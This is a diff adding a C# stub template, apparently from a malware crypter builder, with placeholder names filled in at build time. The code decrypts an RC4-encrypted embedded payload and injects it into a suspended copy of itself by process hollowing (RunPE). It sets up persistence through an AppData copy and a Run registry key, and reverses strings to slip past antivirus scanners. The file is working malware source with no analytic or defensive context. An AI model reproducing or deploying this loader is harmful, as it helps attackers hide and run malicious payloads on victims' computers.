@@ -1,0 +1,277 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Text;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Reflection;
+using System.Resources;
+using System.Windows.Forms;
+using System.Diagnostics;
+using Microsoft.Win32;
+
+[assembly: AssemblyTitle("[a:title]")]
+[assembly: AssemblyDescription("[a:description]")]
+[assembly: AssemblyCompany("[a:company]")]
+[assembly: AssemblyProduct("[a:product]")]
+[assembly: AssemblyCopyright("[a:copyright]")]
+[assembly: AssemblyTrademark("[a:trademark]")]
+[assembly: AssemblyVersion("[a:version]")]
+[assembly: AssemblyFileVersion("[a:version]")]
+
+namespace [namespace]
+{
+	class Program
+	{
+		static void Main(string[] args)
+        {
+            [encryption] [encryption] = new [encryption]();
+			[container] [container] = new [container]();
+			[runpe] [runpe] = new [runpe]();
+			[startup] st = new [startup]();
+			object[] margs = new object[1];
+			
+			byte[] data = [container].[getc]();
+			[encryption].[rc4](ref data, Encoding.ASCII.GetBytes("[key]"));
+						
+			[start]
+			while (![runpe].[run](data)){}
+        }
+	}
+	
+	class [encryption]
+    {
+        public void [rc4](ref Byte[] bytes, Byte[] key)
+        {
+            Byte[] s = new Byte[256];
+            Byte[] k = new Byte[256];
+            Byte[] p = new Byte[256];
+            Byte temp;
+            int i, j;
+
+            string buffer = string.Empty;
+
+
+            for (i = 0; i < 256; i++)
+            {
+                s[i] = (Byte)i;
+                k[i] = key[i % key.GetLength(0)];
+            }
+
+            j = 0;
+            for (i = 0; i < 256; i++)
+            {
+                j = (j + s[i] + k[i]) % 256;
+                temp = s[i];
+                s[i] = s[j];
+                s[j] = temp;
+            }
+
+            i = j = 0;
+
+            for (i = 0; i < 256; i++)
+            {
+                p[i] = s[i];
+                buffer = s[i].ToString("X");
+            }
+
+            for (int x = 0; x < bytes.GetLength(0); x++)
+            {
+                i = (i + 1) % 256;
+                j = (j + s[i]) % 256;
+                temp = s[i];
+                s[i] = s[j];
+                s[j] = temp;
+                int t = (s[i] + s[j]) % 256;
+                bytes[x] ^= s[t];
+            }
+        }
+
+    }
+	
+	class [container]
+	{
+		public byte[] [getc]()
+		{
+			return [str2byt](@"[data]");
+		}
+		
+		private byte[] [str2byt](string data)
+        {
+            string[] str = data.Split('-');
+            byte[] byt = new byte[str.Length];
+            for (int i = 0; i < str.Length; i++)
+                byt[i] = byte.Parse(str[i], System.Globalization.NumberStyles.HexNumber);
+            return byt;
+        }
+	}
+	
+	class [startup]
+	{
+		public void [create](string name, string file)
+		{
+			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + file;
+			int junk = 1337;
+
+			if (!File.Exists(path))
+			{
+				try
+				{
+					File.Copy(Application.ExecutablePath, path);
+				}
+				catch { }
+
+				string reg = @"NuR\NoIsReVtNeRruC\sWoDniW\tFoSorcIM\ErAWTFOS";
+				char[] arr = reg.ToCharArray();
+				Array.Reverse(arr);
+				reg = new string(arr);
+				
+				try
+				{
+					RegistryKey add = Registry.LocalMachine.OpenSubKey(reg, true);
+					add.SetValue(name, path);
+					junk++;
+				} catch {
+					RegistryKey add = Registry.CurrentUser.OpenSubKey(reg, true);
+					add.SetValue(name, path);
+					junk++;
+				}
+			}
+		}
+	}
+	
+	class [runpe]
+    {
+        [DllImport("kernel32.dll")]
+        static extern string GetCommandLineA();
+
+        [DllImport("kernel32.dll")]
+        static extern bool CreateProcess(string lpApplicationName, string commandLine, int processAttributes, int threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref STARTUPINFO startupInfo, out PROCESS_INFORMATION processInformation);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, int lpBaseAddress, byte[] lpBuffer, int nSize, int lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern bool GetThreadContext(IntPtr hThread, ref  CONTEXT lpContext);
+
+        [DllImport("kernel32.dll")]
+        static extern bool SetThreadContext(IntPtr hThread, ref  CONTEXT lpContext);
+
+        [DllImport("kernel32.dll")]
+        static extern int ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
+        static extern int LoadLibrary(
+            [MarshalAs(UnmanagedType.LPStr)] string lpLibFileName);
+
+        [DllImport("kernel32.dll", EntryPoint = "GetProcAddress")]
+        static extern IntPtr GetProcAddress(int hModule,
+            [MarshalAs(UnmanagedType.LPStr)] string lpProcName);
+
+        delegate int _NtUVOS(IntPtr x1, IntPtr x2);
+        _NtUVOS ntUnmap;
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 52)]
+            byte[] unused;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        struct CONTEXT
+        {
+            public uint ContextFlags;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 160)]
+            byte[] unused;
+            public uint Ebx;
+            public uint Edx;
+            public uint Ecx;
+            public uint Eax;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 24)]
+            byte[] unused2;
+        }
+
+        public bool [run](byte[] data)
+        {
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            CONTEXT ctx = new CONTEXT();
+            int pHeader, pOptHdr, pSecHdr, nSections, entryPoint, imageBase, imageSize, headerSize;
+
+            pHeader = BitConverter.ToInt32(data, 0x3C);
+            pOptHdr = pHeader + 0x18;
+            nSections = BitConverter.ToInt16(data, pHeader + 0x6);
+            entryPoint = BitConverter.ToInt32(data, pOptHdr + 0x10);
+            imageBase = BitConverter.ToInt32(data, pOptHdr + 0x1C);
+            imageSize = BitConverter.ToInt32(data, pOptHdr + 0x38);
+            headerSize = BitConverter.ToInt32(data, pOptHdr + 0x3C);
+            pSecHdr = pHeader + 0xF8;
+
+            ctx.ContextFlags = 0x10007;
+
+            ntUnmap = (_NtUVOS)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary("ntdll.dll"), [rstring]("noitceSfOweiVpamnUtN")), typeof(_NtUVOS));
+
+            CreateProcess(Process.GetCurrentProcess().MainModule.FileName, GetCommandLineA(), 0, 0, false, 4, IntPtr.Zero, null, ref si, out pi);
+            
+            ntUnmap(pi.hProcess, (IntPtr)imageBase);
+            if (VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, (uint)imageSize, 0x3000, 0x40) != (IntPtr)imageBase)
+            {
+				//Process.Start(Process.GetCurrentProcess().MainModule.FileName);
+				//Environment.Exit(0);
+				return false;
+            }
+
+            WriteProcessMemory(pi.hProcess, imageBase, data, headerSize, 0);
+
+            for (int i = 0; i < nSections; i++)
+            {
+                Int32 vAddress, sizeData, pRawData;
+                byte[] sData;
+                vAddress = BitConverter.ToInt32(data, pSecHdr + (0x28 * i) + 0xC);
+                sizeData = BitConverter.ToInt32(data, pSecHdr + (0x28 * i) + 0x10);
+                pRawData = BitConverter.ToInt32(data, pSecHdr + (0x28 * i) + 0x14);
+                sData = new byte[sizeData];
+                for (int j = 0; j < sizeData; j++)
+                    sData[j] = data[pRawData + j];
+                WriteProcessMemory(pi.hProcess, imageBase + vAddress, sData, sizeData, 0);
+            }
+
+            GetThreadContext(pi.hThread, ref ctx);
+			
+			byte[] bytes = BitConverter.GetBytes(imageBase);
+            WriteProcessMemory(pi.hProcess, (int)(ctx.Ebx + 8), bytes, bytes.Length, 0);
+			
+            ctx.Eax = (uint)(imageBase + entryPoint);
+
+            SetThreadContext(pi.hThread, ref ctx);
+
+            ResumeThread(pi.hThread);
+            
+            return true;
+        }
+
+        private string [rstring](string s)
+        {
+            char[] arr = s.ToCharArray();
+            Array.Reverse(arr);
+            return new string(arr);
+        }
+
+    }
+}
